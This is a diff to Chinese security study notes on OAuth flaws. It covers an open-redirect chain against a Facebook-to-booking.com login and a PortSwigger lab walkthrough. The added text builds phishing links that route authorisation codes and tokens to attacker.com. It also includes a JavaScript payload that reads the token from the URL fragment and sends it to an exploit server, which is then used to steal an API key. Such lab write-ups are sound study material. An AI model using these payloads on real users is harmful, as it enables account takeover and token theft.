@@ -96,9 +96,9 @@ redirect=参数中，域名往往是被严格控制的，这很好理解，为�
 
 理想的攻击情景是，用户点击我们发送的恶意链接，进入Facebook的授权登录界面，用户授权后，url中携带攻击者感兴趣的code跳转到存在url跳转漏洞的`https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code;state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ&code=666666`，紧接着又因为url跳转漏洞跳转到了state所指向的恶意站点。
 
-这里有一个小trick，重定向一般不会携带查询参数，所以我们链接中的&code=666666可能不会被携带向`https://attacker.com/index.php`发起请求，如何解决这个问题呢？关键在于facebook授权登录url中的参数`response_type=`，将其由`response_type=code`更改为`response_type=code, token`，这会使得Facebook不通过参数发送code，而是通过一个标识片段传递，即`https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code;state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ#code=[secret_code]&access_token=[token]`,url重定向时会携带这个片段标识符
+这里有一个小trick，重定向一般不会携带查询参数（可以观察一下响应包中的location:，其不会携带?后的查询参数），所以我们链接中的&code=666666不会被携带向`https://attacker.com/index.php`发起请求，如何解决这个问题呢？关键在于facebook授权登录url中的参数`response_type=`，将其由`response_type=code`更改为`response_type=code, token`，这会使得Facebook不通过参数发送code，而是通过一个标识片段传递，即`https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code;state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ#code=[secret_code]&access_token=[token]`,url重定向时会携带这个片段标识符，
 
-所以，我们更改最初的链接为`https://www.facebook.com/v3.0/dialog/oauth?redirect_uri=https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code, token;state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ&scope=email&response_type=code&client_id=210068525731476`，用户点击后，最终跳转到如下请求`https://attacker.com/index.php#code=[secret_code]&access_token=[token]`，攻击者就拦截窃取了code
+所以，我们更改最初的链接为`https://www.facebook.com/v3.0/dialog/oauth?redirect_uri=https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code, token;state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ&scope=email&response_type=code&client_id=210068525731476`，用户点击后，最终跳转到如下请求`https://attacker.com/index.php`，攻击者可以通过JavaScript读取#code=[secret_code]&access_token=[token]（示例见portswigger靶场五），攻击者就拦截窃取了code
 
 #### 对于code的利用
 
@@ -426,6 +426,28 @@ OIDC的主要组件：
 
 ![image-20240627174542015](./images/image-20240627174542015.png)
 
-构造恶意链接，发送给受害人
+构造恶意链接，发送给受害人。
 
 ![image-20240627174607044](./images/image-20240627174607044.png)
+
+但是这样我们仍然得不到#后的token，可以观察一下发送`/auth?client_id=zuvm1vumrj7xckovj1d3h&redirect_uri=https://0a8c0023037ccdbc82bc472600f000a5.web-security-academy.net/oauth-callback&response_type=token&nonce=202715255&scope=openid%20profile%20email`这个包后，location中的url有#后的片段，但跟随重定向，请求的url中并没有携带#后的片段，但是我们可以通过JavaScript读取它，这就需要我们稍加修改payload，使用JavaScript读取
+
+![image-20240628111452287](./images/image-20240628111452287.png)
+
+```java
+<script>
+    if (!document.location.hash) {
+        window.location = 'https://oauth-0a4d006103c4cde88222452802e800e5.oauth-server.net/auth?client_id=zuvm1vumrj7xckovj1d3h&redirect_uri=https://0a8c0023037ccdbc82bc472600f000a5.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a67002203ddcd94827646bf019900b4.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email'
+    } else {
+        window.location = '/?'+document.location.hash.substr(1)
+    }
+</script>
+```
+
+将恶意链接发送给受害者，可以看到我们已经获取了token
+
+![image-20240628151943557](./images/image-20240628151943557.png)
+
+使用token窃取apikey
+
+![image-20240628155917645](./images/image-20240628155917645.png)
